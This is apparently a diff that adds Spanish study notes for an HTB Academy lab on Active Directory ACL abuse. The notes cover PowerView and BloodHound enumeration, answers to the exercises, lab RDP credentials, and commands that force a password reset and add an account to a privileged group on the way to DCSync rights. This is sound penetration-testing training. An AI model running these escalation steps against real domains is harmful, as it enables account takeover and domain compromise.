@@ -187,3 +187,296 @@ PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentif
 
 Nuestro usuario **damundsen** tiene **GenericWrite** sobre el grupo **Help Desk Level 1**, lo que le permite añadirse (o añadir a otros) y heredar sus permisos. Además, ese grupo está anidado dentro de **Information Technology**, por lo que al ponernos en **Help Desk Level 1** automáticamente obtenemos todos los derechos que concede **Information Technology**.
 
+##### Investigando el grupo Help Desk Level 1 con Get-DomainGroup
+
+```powershell-session
+PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
+
+memberof                                                                      
+--------                                                                      
+CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+```
+
+En resumen:
+
+- Con la contraseña de **wley** (recuperada y crackeada) hemos visto que su ACL le permite forzar el cambio de contraseña de **damundsen**.    
+- **Damundsen** a su vez tiene **GenericWrite** sobre **Help Desk Level 1**, así que puede añadirse a ese grupo.    
+- **Help Desk Level 1** está anidado en **Information Technology**, así que al entrar en el primero heredamos todos los derechos del segundo.    
+- Miembros de **Information Technology** poseen **GenericAll** sobre **adunn**, lo que nos permitirá modificar membresías, forzar cambios de contraseña o lanzar un Kerberoasting dirigido sobre **adunn**.
+
+##### Investigando el grupo Information Technology
+
+```powershell-session
+PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
+PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
+```
+
+> Finalmente, veamos si el usuario `adunn` tiene algún tipo de acceso interesante que podamos aprovechar para acercarnos a nuestro objetivo
+
+##### Buscando acceso interesante
+
+```powershell-session
+PS C:\htb> $adunnsid = Convert-NameToSid adunn 
+PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
+
+AceQualifier           : AccessAllowed
+ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
+InheritanceFlags       : ContainerInherit
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : ContainerInherit
+InheritedObjectAceType : All
+OpaqueLength           : 0
+
+AceQualifier           : AccessAllowed
+ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : DS-Replication-Get-Changes
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
+InheritanceFlags       : ContainerInherit
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : ContainerInherit
+InheritedObjectAceType : All
+OpaqueLength           : 0
+
+<SNIP>
+```
+
+La salida muestra que el usuario **adunn** tiene los derechos **DS-Replication-Get-Changes** y **DS-Replication-Get-Changes-In-Filtered-Set** sobre el objeto de dominio. Esto significa que podemos usarlo para realizar un ataque DCSync. Cubriremos este ataque en detalle en la sección de DCSync.
+
+### Enumerando ACLs con BloodHound
+
+Ahora que hemos enumerado la ruta de ataque usando métodos más manuales como PowerView y cmdlets nativos de PowerShell, veamos lo mucho más sencillo que habría sido identificarla con la potente herramienta BloodHound. Tomemos los datos que recopilamos antes con el ingestor SharpHound y súbelos a BloodHound. A continuación, podemos establecer al usuario **wley** como nuestro nodo de partida, seleccionar la pestaña **Node Info** y desplazarnos hasta **Outbound Control Rights**. Esta opción nos mostrará los objetos sobre los que tenemos control directo, a través de la pertenencia a grupos, y el número de objetos que nuestro usuario podría llegar a controlar mediante rutas de ataque ACL en **Transitive Object Control**. Si hacemos clic en el “1” junto a **First Degree Object Control**, veremos el primer conjunto de permisos que enumeramos: **ForceChangePassword** sobre el usuario **damundsen**.
+
+##### Viendo información de nodo a través de BloodHound
+
+![[acls_bloodhound1.png]]
+
+Al hacer clic derecho sobre la línea que une los dos nodos, se abre un menú contextual. Si seleccionas **Help**, BloodHound te mostrará:
+- Detalles sobre ese permiso concreto (ACE) y ejemplos de herramientas y comandos para explotarlo.    
+- Consideraciones de seguridad operacional (OpSec).    
+- Referencias externas para profundizar.   
+
+Más adelante exploraremos a fondo este menú y cómo sacarle todo el partido.
+
+##### Investigando ForceChangePassword más
+
+![[acls_bloodhound2.png]]
+Si hacemos click en el `16` al lado de `Transitive Object Control`, veremos la ruta completa que enumeramos dolorosamente arriba. Desde aquí, podríamos aprovechar los menús de ayuda por cada arista para encontrar formas de acontecer cada ataque
+
+##### Viendo rutas potenciales de ataque a través de BloodHound
+
+![[acls_bloodhound3.png]]
+Finalmente, podemos usar `pre-build queries` en BloodHound para confirmar que el usuario `adunn` tiene privilegios DCSync
+
+##### Viendo Pre-Build queries a través de BloodHound
+
+![[acls_Bloodhound4.png]]
+Hemos enumerado estas rutas de ataque en múltiples formas. El siguiente paso será realizar esta cadena de ataque desde el principio hasta el final. Ahora, contestemos las preguntas de la academia.
+
+##### _What is the rights GUID for User-Force-Change-Password?_
+
+> **Respuesta:** 00299570-246d-11d0-a768-00aa006e0529
+
+Lo primero es conectarnos por RDP:
+
+```bash
+rdesktop -u htb-student \
+         -p 'Academy_student_AD!' \
+         -d INLANEFREIGHT.LOCAL \
+         10.129.175.187
+```
+
+En este momento, navegamos a la ruta `C:\Tools` e importamos el módulo de PowerView:
+
+```powershell
+Import-Module .\PowerView.ps1 
+```
+
+Ahora creamos el `$sid` con la siguiente línea:
+
+```powershell
+$sid = Convert-NameToSid wley
+```
+
+> → Usa PowerView para convertir el **nombre de usuario** `wley` en su correspondiente **SID (Security Identifier)**.
+
+```powershell
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+```
+
+- `Get-DomainObjectACL -ResolveGUIDs -Identity *`  
+    → Lista los **ACLs (listas de control de acceso)** de todos los objetos del dominio, resolviendo los GUIDs por nombres legibles.    
+- `| ? {$_.SecurityIdentifier -eq $sid}`  
+    → Filtra solo los objetos cuyos permisos están asignados al **SID** obtenido antes (usuario `wley`).
+
+![[powerview_sid1.png]]
+
+Si queremos ver el GUID:
+
+```powershell
+$sid = Convert-NameToSid wley
+Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+```
+
+| Entry        | Value                               |
+|--------------|-------------------------------------|
+| CN           | User-Force-Change-Password          |
+| Display-Name | Reset Password                      |
+| Rights-GUID  | 00299570-246d-11d0-a768-00aa006e0529 |
+##### _What flag can we use with PowerView to show us the ObjectAceType in a human-readable format during our enumeration?_
+
+> **Respuesta:** ResolveGUIDs
+
+La opción `-ResolveGUIDs` de PowerView se utiliza porque muchos permisos en Active Directory (como los `ExtendedRights` o los `ObjectAceType`) se almacenan internamente como **GUIDs**. Estos identificadores globales únicos son difíciles de interpretar si no se traducen.
+
+##### _What privileges does the user damundsen have over the Help Desk Level 1 group?_
+
+> **Respuesta:** GenericWrite
+
+```powershell
+$sid2 = Convert-NameToSid damundsen
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
+```
+
+Primero, con `$sid2 = Convert-NameToSid damundsen`, obtienes el **SID** del usuario `damundsen`.
+
+Después, ejecutas `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2}`, lo que significa que estás buscando **todos los objetos del dominio sobre los que `damundsen` tiene permisos explícitos**, y los filtras para que solo aparezcan aquellos en los que su **SID esté mencionado en las ACLs**.
+
+El objetivo aquí probablemente sea **ver si `damundsen` tiene control sobre otros objetos**, por ejemplo, si puede cambiar contraseñas, replicar el AD, o tiene control total sobre usuarios o grupos. El flag `-ResolveGUIDs` se usa otra vez para que esos permisos se muestren en texto legible y no como GUIDs.
+
+![[privileges.png]]
+
+##### _Using the skills learned in this section, enumerate the ActiveDirectoryRights that the user forend has over the user dpayne (Dagmar Payne)_
+
+> **Respuesta:** GenericAll
+
+```powershell
+$sid2 = Convert-NameToSid forend
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2}
+```
+
+![[Pasted image 20250721115755.png]]
+
+El propósito aquí es comprobar **qué control tiene `forend` dentro del dominio**, es decir, si tiene permisos especiales sobre otros usuarios, grupos, OU o incluso sobre objetos críticos del dominio. Esto es clave para detectar posibles **delegaciones de control mal configuradas**, útiles para escalada de privilegios.
+
+##### _What is the ObjectAceType of the first right that the forend user has over the GPO Management group? (two words in the format Word-Word)_
+
+> **Respuesta:** Self-Membership
+
+Lo primero es ejecutar SharpHound:
+
+```powershell
+.\SharpHound.exe -c All --zipfilename ILFREIGHT
+```
+
+Este paso recopila toda la información relevante del entorno Active Directory para posteriormente analizarla en la interfaz de **BloodHound** y buscar relaciones de privilegios, rutas de ataque, delegaciones, etc. Después, subimos el archivo ZIP a BloodHound GUI para el análisis.
+
+Seleccionamos FOREND@INLANEFREIGHT.LOCAL como nodo de comienzo. Después, desde la pestaña `Node Info`, navegamos hasta la sección `Outbound Control Rights`, seguida de `First Degree Object Control`
+
+![[Pasted image 20250721120555.png]]
+
+## Tácticas de abuso en ACL
+
+Una vez más, para recapitular dónde estamos y hacia dónde queremos llegar: tenemos control sobre el usuario `wley`, cuya **hash NTLMv2** obtuvimos previamente ejecutando **Responder** durante la fase inicial de la auditoría. Tuvimos suerte, ya que este usuario usaba una contraseña débil, y pudimos **crackear la hash offline con Hashcat** y recuperar el valor en texto claro.
+
+Sabemos que podemos usar este acceso para iniciar una cadena de ataque que nos permitirá tomar el control del usuario `adunn`, quien **tiene permisos para realizar un ataque DCSync**. Esto nos daría control total sobre el dominio, permitiéndonos obtener los hashes NTLM de todas las cuentas del dominio, escalar privilegios a **Domain Admin / Enterprise Admin** e incluso establecer **persistencia**.
+
+Para ejecutar esta cadena de ataque, debemos hacer lo siguiente:
+
+1. Usar el usuario `wley` para **cambiar la contraseña** del usuario `damundsen`.    
+2. Autenticarnos como `damundsen` y aprovechar los **permisos GenericWrite** para añadir un usuario bajo nuestro control al grupo **Help Desk Level 1**.   
+3. Aprovechar la **membresía en grupos anidados** del grupo **Information Technology** y los **permisos GenericAll** para tomar el control del usuario `adunn`.    
+
+Por tanto, lo primero es autenticarnos como `wley` y forzar el cambio de contraseña del usuario `damundsen`. Podemos empezar abriendo una consola de PowerShell y autenticándonos como el usuario `wley`, a menos que ya estemos ejecutando la sesión bajo esa identidad. Para ello, podemos crear un objeto `PSCredential`.
+
+##### Creando un objeto PSCredential
+
+```powershell
+PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+```
+
+Después, debemos crear un [SecureString object](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0)  que representa la contraseña que queremos usar para el usuario objetivo `damundsen`. 
+
+##### Creando un objeto SecureString
+
+```powershell
+PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+```
+
+Finalmente, usaremos la función `Set-DomainUserPassword` de PowerView para cambiar la contraseña del usuario. Es necesario usar el parámetro `-Credential` junto con el objeto de credenciales que creamos para el usuario `wley`. Es recomendable añadir siempre el flag `-Verbose` para obtener retroalimentación sobre si el comando se ejecutó correctamente o para ver el mayor nivel de detalle posible en caso de error. También podríamos hacer esto desde una máquina atacante Linux utilizando una herramienta como `pth-net`, que forma parte del conjunto de herramientas **pth-toolkit**.
+
+##### Cambiando la contraseña del usuario
+
+```powershell
+PS C:\htb> cd C:\Tools\
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+
+VERBOSE: [Get-PrincipalContext] Using alternate credentials
+VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
+VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
+```
+
+Podemos ver que el comando se ejecutó correctamente, cambiando la contraseña del usuario objetivo utilizando las credenciales que especificamos para el usuario `wley`, sobre el cual tenemos control. A continuación, necesitamos llevar a cabo un proceso similar para **autenticarnos como el usuario `damundsen`** y **añadirnos al grupo Help Desk Level 1**.
+
+##### Creando un SecureString Object usando damundsen
+
+```powershell
+PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
+```
+
+Después, podemos usar la función [Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/) para añadirnos a nosotros mismos en el grupo objetivo. Podemos primero confirmar que nuestro usuario no es un miembro del grupo objetivo. Esto también se podría hacer desde Linux usando `pth-toolkit`.
+
+##### Añadiendo damundsen al grupo Help Desk Level 1
+
+```powershell
+PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
+
+CN=Stella Blagg,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Marie Wright,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+...SNIP...
+```
+
+```powershell
+PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+
+VERBOSE: [Get-PrincipalContext] Using alternate credentials
+VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
+```
+
+##### Confirmando que damundsen ha sido añadido al grupo
+
+```powershell
+PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+
+MemberName
+----------
+busucher
+spergazed
+
+<SNIP>
+
+damundsen
+dpayne
+```
